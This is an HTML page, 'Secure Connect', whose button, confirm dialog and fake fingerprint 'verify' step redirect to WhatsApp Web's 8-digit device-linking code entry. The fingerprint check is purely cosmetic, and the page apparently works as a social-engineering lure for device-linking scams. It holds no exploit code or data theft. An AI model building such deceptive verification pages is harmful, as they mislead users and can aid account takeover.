<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Device Link</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0a0a0f;
            padding: 16px;
        }
        .card {
            background: #161b22;
            border-radius: 28px;
            padding: 40px 28px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
            position: relative;
            overflow: hidden;
        }
        .headline {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            line-height: 1.3;
            margin-bottom: 6px;
            letter-spacing: -0.3px;
        }
        .headline span {
            background: linear-gradient(135deg, #25D366, #128C7E);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .tagline {
            color: #8b949e;
            font-size: 14px;
            margin-bottom: 32px;
        }
        .btn-main {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: #fff;
            border: none;
            padding: 18px 52px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 30px rgba(37,211,102,0.25);
            letter-spacing: 0.5px;
        }
        .btn-main:hover {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 12px 40px rgba(37,211,102,0.35);
        }
        .btn-main:active {
            transform: scale(0.96);
        }
        /* Confirm overlay */
        .overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.75);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .overlay.show {
            display: flex;
        }
        .modal {
            background: #1c2333;
            border-radius: 24px;
            padding: 32px 28px;
            max-width: 360px;
            width: 90%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.08);
            animation: modalIn 0.25s ease-out;
        }
        @keyframes modalIn {
            from { transform: scale(0.85) translateY(10px); opacity: 0; }
            to { transform: scale(1) translateY(0); opacity: 1; }
        }
        .modal h3 {
            color: #fff;
            font-size: 20px;
            margin-bottom: 6px;
        }
        .modal p {
            color: #8b949e;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .modal-actions {
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        .btn-no {
            background: rgba(255,255,255,0.06);
            color: #c9d1d9;
            border: 1px solid rgba(255,255,255,0.1);
            padding: 12px 26px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-no:hover {
            background: rgba(255,255,255,0.12);
        }
        .btn-yes {
            background: #25D366;
            color: #fff;
            border: none;
            padding: 12px 26px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-yes:hover {
            background: #20bd5a;
            transform: scale(1.03);
        }
        /* Fingerprint */
        .fingerprint-wrap {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 24px;
        }
        .fingerprint-wrap.show {
            display: flex;
        }
        .fingerprint-circle {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            background: rgba(37,211,102,0.08);
            border: 2px solid rgba(37,211,102,0.25);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            animation: breathe 1.6s ease-in-out infinite;
            transition: 0.2s;
        }
        .fingerprint-circle:active {
            transform: scale(0.92);
        }
        @keyframes breathe {
            0%, 100% { box-shadow: 0 0 0 0 rgba(37,211,102,0.15); }
            50% { box-shadow: 0 0 0 22px rgba(37,211,102,0); }
        }
        .fingerprint-circle svg {
            width: 38px;
            height: 38px;
            fill: #25D366;
        }
        .fingerprint-label {
            color: #25D366;
            font-size: 13px;
            font-weight: 500;
            margin-top: 8px;
        }
        .status {
            color: #f0c040;
            font-size: 13px;
            margin-top: 14px;
            min-height: 20px;
        }
        .footer-note {
            margin-top: 28px;
            color: #484f58;
            font-size: 11px;
            border-top: 1px solid rgba(255,255,255,0.04);
            padding-top: 16px;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="headline">🔐 <span>Secure Connect</span></div>
    <div class="tagline">One tap → WhatsApp 8-digit code entry</div>

    <button class="btn-main" id="startBtn">🚀 Start Now</button>

    <div class="fingerprint-wrap" id="fingerprintWrap">
        <div class="fingerprint-circle" id="fingerprintCircle">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.2 13.87 2.5 11.99 2.5c-1.88 0-3.67.7-5.59 1.91-.07.04-.15.06-.23.06-.29 0-.53-.23-.53-.53 0-.19.1-.36.26-.45C8.07 1.07 10.01.5 11.99.5c1.98 0 3.92.57 6.1 1.95.16.09.26.26.26.45 0 .3-.24.57-.54.57zM11.99 5.5c-1.35 0-2.64.47-3.85 1.4-.07.06-.16.09-.25.09-.22 0-.43-.17-.43-.42 0-.18.1-.34.25-.43 1.41-1.07 2.9-1.64 4.28-1.64s2.87.57 4.28 1.64c.15.09.25.25.25.43 0 .25-.21.42-.43.42-.09 0-.18-.03-.25-.09-1.21-.93-2.5-1.4-3.85-1.4zM11.99 8.5c-1.11 0-2.21.37-3.33 1.11-.08.06-.18.09-.28.09-.2 0-.38-.15-.38-.36 0-.16.09-.31.22-.39 1.29-.87 2.59-1.35 3.77-1.35s2.48.48 3.77 1.35c.13.08.22.23.22.39 0 .21-.18.36-.38.36-.1 0-.2-.03-.28-.09-1.12-.74-2.22-1.11-3.33-1.11zM12 22.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
            </svg>
        </div>
        <span class="fingerprint-label">👆 Touch to verify</span>
    </div>

    <div class="status" id="statusMsg"></div>

    <div class="footer-note">🔒 Direct to WhatsApp code entry</div>
</div>

<!-- Confirm Modal -->
<div class="overlay" id="confirmOverlay">
    <div class="modal">
        <h3>🔐 Confirm</h3>
        <p>Proceed to WhatsApp's <strong>8-digit code</strong> entry page?<br>You'll land on the 8 empty boxes.</p>
        <div class="modal-actions">
            <button class="btn-no" id="cancelBtn">Cancel</button>
            <button class="btn-yes" id="confirmBtn">✅ Yes, Go</button>
        </div>
    </div>
</div>

<script>
(function() {
    const startBtn = document.getElementById('startBtn');
    const overlay = document.getElementById('confirmOverlay');
    const cancelBtn = document.getElementById('cancelBtn');
    const confirmBtn = document.getElementById('confirmBtn');
    const fingerprintWrap = document.getElementById('fingerprintWrap');
    const fingerprintCircle = document.getElementById('fingerprintCircle');
    const statusMsg = document.getElementById('statusMsg');

    // ── Step 1: Click "Start Now" → show confirm modal ──
    startBtn.addEventListener('click', function() {
        overlay.classList.add('show');
        statusMsg.textContent = '';
    });

    // ── Step 2: Cancel → close modal ──
    cancelBtn.addEventListener('click', function() {
        overlay.classList.remove('show');
    });

    // ── Step 3: Confirm → hide button, show fingerprint ──
    confirmBtn.addEventListener('click', function() {
        overlay.classList.remove('show');
        startBtn.style.display = 'none';
        fingerprintWrap.classList.add('show');
        statusMsg.textContent = '👆 Touch the fingerprint to continue';
    });

    // ── Step 4: Fingerprint touch → go to WhatsApp link page ──
    function goToWhatsApp() {
        statusMsg.textContent = '⏳ Opening WhatsApp code entry...';
        fingerprintCircle.style.pointerEvents = 'none';
        fingerprintCircle.style.opacity = '0.5';

        setTimeout(function() {
            // WhatsApp Web — this is where the 8-digit code input boxes appear
            // when you select "Link with phone number" option
            window.location.href = 'https://web.whatsapp.com/';
        }, 500);
    }

    fingerprintCircle.addEventListener('click', goToWhatsApp);

    // Allow clicking the wrap area too
    fingerprintWrap.addEventListener('click', function(e) {
        if (e.target === fingerprintWrap || e.target.classList.contains('fingerprint-label')) {
            goToWhatsApp();
        }
    });
})();
</script>
</body>
</html>
